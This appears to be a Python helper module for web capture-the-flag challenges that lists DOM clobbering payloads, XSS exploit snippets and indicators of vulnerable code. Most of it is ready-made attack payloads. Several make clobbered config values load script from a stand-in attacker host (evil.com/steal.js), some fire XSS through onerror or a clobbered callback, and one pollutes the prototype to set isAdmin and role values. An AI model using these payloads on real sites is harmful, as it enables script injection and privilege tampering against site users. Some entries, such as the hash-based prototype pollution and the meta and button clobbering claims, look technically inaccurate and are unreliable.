"""
DOM Clobbering Payload Crafter for Web CTF.
Covers HTML element ID/name clobbering, form/iframe clobbering,
and prototype pollution via DOM.
"""

from typing import List, Dict


def get_dom_clobbering_payloads() -> List[Dict[str, str]]:
    """Generate DOM clobbering payloads."""
    return [
        {
            "name": "Basic ID Clobbering",
            "payload": '<div id="config"></div>',
            "desc": "Creates window.config via element ID."
        },
        {
            "name": "Form Element Clobbering",
            "payload": '<form id="config"><input name="apiUrl" value="//evil.com/steal.js"></form>',
            "desc": "Clobbers window.config.apiUrl via form input name."
        },
        {
            "name": "Anchor Href Clobbering",
            "payload": '<a id="config" href="//evil.com/steal.js"></a>',
            "desc": "Clobbers window.config with anchor href."
        },
        {
            "name": "Nested Element Clobbering",
            "payload": '<form id="config"><input name="apiUrl"><input name="apiUrl" value="//evil.com"></form>',
            "desc": "Multiple inputs with same name create an array (HTMLCollection)."
        },
        {
            "name": "Iframe Name Clobbering",
            "payload": '<iframe name="config" src="//evil.com"></iframe>',
            "desc": "Clobbers window.config via iframe name."
        },
        {
            "name": "Image Name Clobbering",
            "payload": '<img name="config" src="x" onerror="alert(1)">',
            "desc": "Clobbers window.config via image name."
        },
        {
            "name": "Object Element Clobbering",
            "payload": '<object id="config" data="//evil.com/steal.js"></object>',
            "desc": "Clobbers window.config via object element."
        },
        {
            "name": "Meta Content Clobbering",
            "payload": '<meta id="config" content="//evil.com/steal.js">',
            "desc": "Clobbers window.config via meta content."
        },
        {
            "name": "Form Action Clobbering",
            "payload": '<form id="config" action="//evil.com/steal.js"></form>',
            "desc": "Clobbers window.config.action via form action."
        },
        {
            "name": "Button Value Clobbering",
            "payload": '<button id="config" value="//evil.com/steal.js"></button>',
            "desc": "Clobbers window.config.value via button value."
        }
    ]


def get_dom_clobbering_exploits() -> List[Dict[str, str]]:
    """Generate DOM clobbering exploit payloads."""
    return [
        {
            "name": "XSS via Clobbered Config",
            "payload": """<script>
// Vulnerable code: eval(config.apiUrl)
// After clobbering, config.apiUrl = //evil.com/steal.js
</script>
<form id="config"><input name="apiUrl" value="//evil.com/steal.js"></form>""",
            "desc": "Exploits vulnerable JS that reads config.apiUrl."
        },
        {
            "name": "XSS via Clobbered Src",
            "payload": """<script>
// Vulnerable code: document.write('<script src="' + config.src + '">')
</script>
<a id="config" href="//evil.com/steal.js"></a>""",
            "desc": "Exploits vulnerable JS that reads config.src."
        },
        {
            "name": "XSS via Clobbered Callback",
            "payload": """<script>
// Vulnerable code: config.callback()
</script>
<form id="config"><input name="callback" value="alert(1)"></form>""",
            "desc": "Exploits vulnerable JS that calls config.callback()."
        },
        {
            "name": "Prototype Pollution via DOM",
            "payload": """<script>
// Vulnerable code: merge({}, JSON.parse(location.hash.slice(1)))
</script>
#__proto__[isAdmin]=true&__proto__[role]=admin""",
            "desc": "Pollutes Object.prototype via URL hash."
        }
    ]


def get_dom_clobbering_indicators() -> List[Dict[str, str]]:
    """Indicators that DOM clobbering is possible."""
    return [
        {
            "indicator": "window.X access",
            "desc": "JS accesses window.X or bare X where X can be clobbered by an element ID."
        },
        {
            "indicator": "document.getElementById",
            "desc": "JS uses getElementById with attacker-controlled input."
        },
        {
            "indicator": "config object",
            "desc": "JS reads properties from a config object that can be clobbered."
        },
        {
            "indicator": "innerHTML injection",
            "desc": "JS injects attacker-controlled HTML into innerHTML."
        },
        {
            "indicator": "document.write",
            "desc": "JS uses document.write with attacker-controlled input."
        }
    ]
